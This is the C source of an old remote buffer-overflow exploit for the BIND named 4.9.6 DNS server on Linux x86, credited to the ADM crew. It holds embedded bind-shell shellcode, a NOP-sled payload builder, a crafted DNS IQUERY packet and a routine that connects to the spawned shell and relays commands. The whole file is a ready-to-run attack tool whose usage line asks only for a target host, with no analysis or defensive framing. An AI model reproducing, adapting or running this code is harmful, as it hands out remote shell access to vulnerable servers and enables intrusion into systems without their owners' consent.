/*
 * THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE FROM THE ADM CREW
 *
 * named_v3.c   improved linux x86 named 4.9.6-REL exploit
 * by plaguez aka ndubee.
 * thanks to napster, and prym for the shellcode
 *
 */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <time.h>
#include <string.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <netdb.h>
#include <getopt.h>


#define NOP 0x90
#define WAITPORT 10752



char buff[10000];

char c0de[] =
"\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x4c\xeb\x4c\x5e\xb0\x02\x89"
"\x06\xfe\xc8\x89\x46\x04\xb0\x06\x89\x46\x08\xb0\x66\x31\xdb\xfe"
"\xc3\x89\xf1\xcd\x80\x89\x06\xb0\x02\x66\x89\x46\x0c\xb0\x2a\x66"
"\x89\x46\x0e\x8d\x46\x0c\x89\x46\x04\x31\xc0\x89\x46\x10\xb0\x10"
"\x89\x46\x08\xb0\x66\xfe\xc3\xcd\x80\xb0\x01\x89\x46\x04\xb0\x66"
"\xb3\x04\xcd\x80\xeb\x04\xeb\x4a\xeb\x50\x31\xc0\x89\x46\x04\x89"
"\x46\x08\xb0\x66\xfe\xc3\xcd\x80\x88\xc3\xb0\x3f\x31\xc9\xcd\x80"
"\xb0\x3f\xfe\xc1\xcd\x80\xb0\x3f\xfe\xc1\xcd\x80\xb8\x2f\x62\x69"
"\x6e\x89\x06\xb8\x2f\x73\x68\x21\x89\x46\x04\x31\xc0\x88\x46\x07"
"\x89\x76\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"
"\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\x5d\xff\xff\xff";

char shellcode[500];



void handle_alarm(sn)
int sn;
{
    alarm(0);
    signal(SIGALRM, SIG_DFL);
    printf("Unable to connect: Connection timed out\n");
    exit(0);
}




void addchar(char *str, char ch)
{
    unsigned int len;

    len = strlen(str);
    str[len] = ch;
    str[len + 1] = 0;
}



int ConnectServer(char *host, int port)
{
    int sockdesc;
    struct sockaddr_in sin;
    struct hostent *he;

    sin.sin_port = htons(port);
    sin.sin_family = AF_INET;

    he = gethostbyname(host);
    if (he) {
	memcpy((caddr_t) & sin.sin_addr.s_addr, he->h_addr, he->h_length);
    } else {
	printf("Error: gethostbyname(): Unable to resolve [%s]\n", host);
	exit(-1);
    }

    if ((sockdesc = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
	perror("Error: socket()");
	exit(-1);
    }
    if (connect(sockdesc, (struct sockaddr *) &sin, sizeof(sin)) < 0) {
	perror("Error: connect()");
	exit(-1);
    }
    return sockdesc;
}

void MultiplexConnection(int sockdesc)
{
    int ret;
    char sockbuf[2048];
    fd_set readfds;

    while (1) {
	FD_ZERO(&readfds);
	FD_SET(0, &readfds);
	FD_SET(sockdesc, &readfds);
	select(255, &readfds, NULL, NULL, NULL);

	if (FD_ISSET(sockdesc, &readfds)) {
	    memset(sockbuf, 0, 2048);
	    ret = read(sockdesc, sockbuf, 2048);
	    if (ret <= 0) {
		printf("Connection closed by foreign host.\n");
		exit(-1);
	    }
	    printf("%s", sockbuf);
	}
	if (FD_ISSET(0, &readfds)) {
	    memset(sockbuf, 0, 2048);
	    read(0, sockbuf, 2048);
	    write(sockdesc, sockbuf, 2048);
	}
    }
}



int lookup_host(ra, hn, rp)
struct sockaddr_in *ra;
char *hn;
unsigned short rp;
{
    ra->sin_family = AF_INET;
    ra->sin_port = htons(rp);
    if ((ra->sin_addr.s_addr = inet_addr(hn)) == -1) {
	struct hostent *he;

	if ((he = gethostbyname(hn)) != (struct hostent *) NULL) {
	    memcpy(&ra->sin_addr.s_addr, he->h_addr, 4);
	    return 1;
	} else
	    herror("Unable to resolve hostname");
    } else
	return 1;
    return 0;
}

void attack_bind(ra, loc)
struct sockaddr_in ra;
char *loc;
{
    int sd, pktlen, sockdesc;
    char keypkt[6000], rname[6000];
    struct hostent *he;


    if ((sd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
	perror("cannot open tcp socket");
	return;
    }
    printf("Connecting to nameserver via TCP..");
    fflush(stdout);
    signal(SIGALRM, handle_alarm);
    alarm(15);
    if (connect(sd, (struct sockaddr *) &ra, sizeof(ra)) == -1) {
	perror("Unable to connect");
	close(sd);
	return;
    }
    printf(".done.\n");
    alarm(0);

    if ((he = gethostbyaddr((char *) &ra.sin_addr, sizeof(ra.sin_addr), AF_INET)) == (struct hostent *) NULL)
	sprintf(rname, "%s", inet_ntoa(ra.sin_addr));
    else
	strncpy(rname, he->h_name, sizeof(rname));



    pktlen = make_keypkt(keypkt);
    send_packet(sd, keypkt, pktlen);
    close(sd);

    printf("Attente connexion...\n");
    fflush(stdout);
    sleep(5);
    sockdesc = ConnectServer(loc, WAITPORT);


    printf("Shell found! Free to execute commands suffixed with a ';'\n");
    MultiplexConnection(sockdesc);
    close(sockdesc);

    exit(-1);

}




int make_keypkt(pktbuf)
char *pktbuf;
{
    HEADER *dnsh;
    char *ptr = pktbuf;
    int pktlen = 0;
    unsigned long ttl = 31337;


    memset(pktbuf, 0, sizeof(pktbuf));

/* fill the dns header */
    dnsh = (HEADER *) ptr;
    dnsh->id = htons(rand() % 65535);
    dnsh->qr = 0;
    dnsh->opcode = IQUERY;
    dnsh->aa = 0;
    dnsh->tc = 0;
    dnsh->rd = 1;
    dnsh->ra = 1;
    dnsh->unused = 0;
/* removed for portability (it's zero already)
   dnsh->pr             = 0;
 */
    dnsh->rcode = 0;
    dnsh->qdcount = htons(0);
    dnsh->ancount = htons(1);
    dnsh->nscount = htons(0);
    dnsh->arcount = htons(0);
    pktlen += sizeof(HEADER);
    ptr += sizeof(HEADER);
/* this is the domain name (nothing here) */
    *(ptr++) = '\0';
    pktlen++;
/* fill out the rest of the rr */

    PUTSHORT(T_A, ptr);
    PUTSHORT(C_IN, ptr);
    PUTLONG(ttl, ptr);
    PUTSHORT((strlen(buff) + 1), ptr);

    memcpy(ptr + 1, buff, strlen(buff) + 1);
    ptr = ptr + (strlen(buff) + 1);

    pktlen += ((sizeof(short) * 3) + sizeof(long) + (strlen(buff) + 1));

    return pktlen;
}

int send_packet(sd, pktbuf, pktlen)
int sd, pktlen;
char *pktbuf;
{
    char tmp[2], *tmpptr;

    tmpptr = tmp;
    PUTSHORT(pktlen, tmpptr);
    if (write(sd, tmp, 2) != 2 || write(sd, pktbuf, pktlen) != pktlen) {
	perror("write failed");
	return 0;
    }
    return 1;
}


void usage(char *pname)
{
    printf("\nUsage:\t%s targethost [offset]\n", pname);
    printf("\ttargethost may either be name or ip.\n\n");
}

void main(argc, argv)
int argc;
char *argv[];
{
    int i;
    struct sockaddr_in ra;
    char *ptr;
    char *endbuff;
    unsigned long addr;
    unsigned char jmp;

    int offset = 2750;		/* 2200 --> 3500 */
    int bsize = 1536;

    if (argc < 2) {
	usage(argv[0]);
	exit(1);
    }
    if (argc == 3)
	offset += atoi(argv[2]);


    strcpy(shellcode, c0de);



    addr = 0xbffffff0 - offset;

    printf("longueur shellcode : %i\n", strlen(c0de));
    printf("taille buffer %i\n", bsize);
    printf("offset %i\n", offset);
    printf("adresse: 0x%lx\n", addr);

    endbuff = buff + bsize;

    for (ptr = buff; ptr < (endbuff - strlen(shellcode) - 8); ptr++)
	*ptr = NOP;
    for (i = 0; i < strlen(shellcode); i++)
	*(ptr++) = shellcode[i];
    *((long *) ptr) = addr - 16;
    *((long *) (ptr + 4)) = addr;
    *(ptr + 9) = 0;

    if (!lookup_host(&ra, argv[1], NAMESERVER_PORT))
	return;

    srand(time(NULL));
    attack_bind(ra, argv[1]);
}
